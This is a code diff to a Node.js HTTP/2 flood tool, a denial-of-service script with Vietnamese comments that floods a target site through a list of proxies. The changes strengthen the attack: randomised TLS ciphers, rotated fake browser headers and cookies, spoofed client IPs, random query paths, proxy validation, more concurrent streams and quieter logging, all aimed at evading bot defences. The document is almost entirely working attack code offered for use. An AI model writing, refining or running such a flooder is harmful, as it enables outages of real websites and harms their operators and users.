@@ -48,8 +48,8 @@ function randstr(length) {
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
-    Rate: parseInt(process.argv[4]) * 1.5, // Tăng rate lên 1.5 lần
-    threads: parseInt(process.argv[5]) + 2, // Tăng nhẹ số luồng
+    Rate: Math.floor(parseInt(process.argv[4]) * 1.3),
+    threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
 };
 
@@ -59,38 +59,39 @@ if (!parsedTarget.protocol || !parsedTarget.host) {
     process.exit(1);
 }
 
-// Danh sách User-Agent mở rộng
 const userAgents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/124.0.2478.51",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/126.0.2592.68",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Android 14; Mobile; rv:127.0) Gecko/127.0 Firefox/127.0",
+    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Mobile Safari/537.36"
 ];
 
-// Danh sách header bổ sung
 const accept_header = [
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
     "application/json, text/plain, */*",
-    "text/html,application/xhtml+xml,*/*"
+    "text/html,application/xhtml+xml,*/*;q=0.9"
 ];
 const lang_header = [
     "en-US,en;q=0.9",
     "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
     "zh-CN,zh;q=0.9,en;q=0.8",
-    "ja-JP,ja;q=0.9,en;q=0.8"
+    "ja-JP,ja;q=0.9,en;q=0.8",
+    "fr-FR,fr;q=0.9,en;q=0.8"
 ];
 const encoding_header = [
+    "gzip, deflate, br, zstd",
     "gzip, deflate, br",
-    "gzip, deflate",
-    "br, gzip"
+    "br, gzip",
+    "deflate, gzip"
 ];
 const sec_fetch_headers = {
-    "sec-fetch-dest": ["document", "empty", "script", "image"],
+    "sec-fetch-dest": ["document", "empty", "script", "image", "font"],
     "sec-fetch-mode": ["navigate", "cors", "no-cors", "same-origin"],
-    "sec-fetch-site": ["same-origin", "same-site", "cross-site", "none"],
+    "sec-fetch-site": ["same-origin", "same-site", "cross-site", "none"]
 };
 const cache_control = ["max-age=0", "no-cache", "no-store", "must-revalidate"];
 const referers = [
@@ -102,13 +103,19 @@ const referers = [
 ];
 const platforms = ["Windows", "Macintosh", "iPhone", "Android"];
 const sec_ch_ua = [
-    '"Google Chrome";v="124", "Chromium";v="124", "Not.A/Brand";v="99"',
-    '"Microsoft Edge";v="124", "Chromium";v="124", "Not.A/Brand";v="99"',
-    '"Firefox";v="125"',
+    '"Google Chrome";v="126", "Chromium";v="126", "Not.A/Brand";v="99"',
+    '"Microsoft Edge";v="126", "Chromium";v="126", "Not.A/Brand";v="99"',
+    '"Firefox";v="127"',
     '"Safari";v="17"'
 ];
+const sec_ch_ua_full_version = [
+    '"126.0.6478.126"',
+    '"126.0.2592.68"',
+    '"127.0.0"',
+    '"17.5.0"'
+];
+const priorities = ["u=0, i", "u=1", "u=2"];
 
-// Danh sách ciphers mở rộng
 const ciphers = [
     "TLS_AES_128_GCM_SHA256",
     "TLS_AES_256_GCM_SHA384",
@@ -118,22 +125,67 @@ const ciphers = [
     "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
     "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
     "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256"
-].join(":");
+];
 
-const proxies = readLines(args.proxyFile);
+// Random hóa ciphers
+function getRandomCiphers() {
+    const shuffled = ciphers.sort(() => 0.5 - Math.random());
+    return shuffled.slice(0, randomIntn(4, ciphers.length)).join(":");
+}
+
+let proxies = readLines(args.proxyFile);
+
+async function validateProxy(proxy) {
+    return new Promise((resolve) => {
+        const [host, port] = proxy.split(":");
+        const socket = net.connect({ host, port, timeout: 3000 });
+        socket.on("connect", () => {
+            socket.destroy();
+            resolve(true);
+        });
+        socket.on("error", () => {
+            socket.destroy();
+            resolve(false);
+        });
+        socket.on("timeout", () => {
+            socket.destroy();
+            resolve(false);
+        });
+    });
+}
+
+async function filterProxies(proxies) {
+    const validProxies = [];
+    for (const proxy of proxies) {
+        if (await validateProxy(proxy)) {
+            validProxies.push(proxy);
+        }
+    }
+    return validProxies;
+}
 
 if (cluster.isMaster) {
     console.clear();
-    console.log(`Target: ${parsedTarget.host}`);
-    console.log(`Duration: ${args.time}`);
-    console.log(`Threads: ${args.threads}`);
-    console.log(`RPS: ${args.Rate}`);
-    for (let counter = 1; counter <= args.threads; counter++) {
-        cluster.fork();
-    }
-    setTimeout(() => process.exit(0), args.time * 1000);
+    console.log("Validating proxies...");
+    filterProxies(proxies).then(validProxies => {
+        if (validProxies.length === 0) {
+            console.error("No valid proxies found");
+            process.exit(1);
+        }
+        proxies.length = 0;
+        proxies.push(...validProxies);
+        console.log(`Target: ${parsedTarget.host}`);
+        console.log(`Duration: ${args.time}`);
+        console.log(`Threads: ${args.threads}`);
+        console.log(`RPS: ${args.Rate}`);
+        console.log(`Valid proxies: ${proxies.length}`);
+        for (let counter = 1; counter <= args.threads; counter++) {
+            cluster.fork();
+        }
+        setTimeout(() => process.exit(0), args.time * 1000);
+    });
 } else {
-    setInterval(runFlooder, 80); // Giảm nhẹ thời gian chờ để tăng tốc độ
+    setInterval(runFlooder, 90); // Giảm thời gian chờ để tăng tần suất
 }
 
 class NetSocket {
@@ -160,19 +212,19 @@ class NetSocket {
             const isAlive = response.includes("HTTP/1.1 200");
             if (!isAlive) {
                 connection.destroy();
-                return callback(undefined, `error: invalid response from proxy ${options.host}:${options.port}`);
+                return callback(undefined, "invalid response");
             }
             return callback(connection, undefined);
         });
 
         connection.on("timeout", () => {
             connection.destroy();
-            return callback(undefined, `error: timeout exceeded for ${options.host}:${options.port}`);
+            return callback(undefined, "timeout");
         });
 
-        connection.on("error", error => {
+        connection.on("error", () => {
             connection.destroy();
-            return callback(undefined, `error: ${error.message} for ${options.host}:${options.port}`);
+            return callback(undefined, "error");
         });
     }
 }
@@ -186,9 +238,10 @@ function generateDynamicPath() {
         `id=${randstr(6)}`,
         `page=${randomIntn(1, 100)}`,
         `token=${randstr(10)}`,
-        `search=${randstr(5)}`
+        `search=${randstr(5)}`,
+        `category=${randstr(7)}`
     ];
-    const queryCount = randomIntn(1, 3);
+    const queryCount = randomIntn(1, 4);
     const selectedQueries = [];
     for (let i = 0; i < queryCount; i++) {
         selectedQueries.push(randomElement(queries));
@@ -197,6 +250,7 @@ function generateDynamicPath() {
 }
 
 function generateDynamicHeaders() {
+    const cookie = randomIntn(0, 3) > 0 ? `session=${randstr(16)}; user=${randstr(8)}` : "";
     return {
         ":method": "GET",
         ":authority": parsedTarget.host,
@@ -212,10 +266,13 @@ function generateDynamicHeaders() {
         "sec-ch-ua": randomElement(sec_ch_ua),
         "sec-ch-ua-mobile": randomElement(["?0", "?1"]),
         "sec-ch-ua-platform": randomElement(platforms),
+        "sec-ch-ua-full-version": randomElement(sec_ch_ua_full_version),
         "cache-control": randomElement(cache_control),
         "referer": randomElement(referers),
         "upgrade-insecure-requests": "1",
-        "x-forwarded-for": `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}`
+        "priority": randomElement(priorities),
+        "x-forwarded-for": `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}`,
+        ...(cookie && { "cookie": cookie })
     };
 }
 
@@ -223,7 +280,6 @@ function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     if (!parsedProxy[0] || !parsedProxy[1]) {
-        console.error(`Invalid proxy format: ${proxyAddr}`);
         return setTimeout(runFlooder, 800);
     }
 
@@ -231,7 +287,7 @@ function runFlooder() {
         host: parsedProxy[0],
         port: parseInt(parsedProxy[1]),
         address: parsedTarget.host + ":443",
-        timeout: 3 // Giảm timeout để loại bỏ proxy chậm nhanh hơn
+        timeout: 3
     };
 
     let retryCount = 0;
@@ -242,10 +298,7 @@ function runFlooder() {
             if (connection) connection.destroy();
             if (retryCount < maxRetries) {
                 retryCount++;
-                console.error(`Retrying (${retryCount}/${maxRetries}) for ${proxyAddr}: ${error}`);
                 setTimeout(runFlooder, 800);
-            } else {
-                console.error(`Max retries reached for ${proxyAddr}`);
             }
             return;
         }
@@ -253,7 +306,7 @@ function runFlooder() {
         const tlsOptions = {
             secure: true,
             ALPNProtocols: ['h2', 'http/1.1'],
-            ciphers: ciphers,
+            ciphers: getRandomCiphers(),
             ecdhCurve: 'auto',
             host: parsedTarget.host,
             servername: parsedTarget.host,
@@ -269,7 +322,7 @@ function runFlooder() {
             protocol: "https:",
             settings: {
                 headerTableSize: 65536,
-                maxConcurrentStreams: 128, // Tăng số lượng stream đồng thời
+                maxConcurrentStreams: 150,
                 initialWindowSize: 6291456,
                 maxHeaderListSize: 65536,
                 enablePush: false
@@ -292,7 +345,7 @@ function runFlooder() {
                     });
                     request.end();
                 }
-            }, 80); // Giảm thời gian chờ để tăng tần suất flood
+            }, 90);
             setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
         });
 
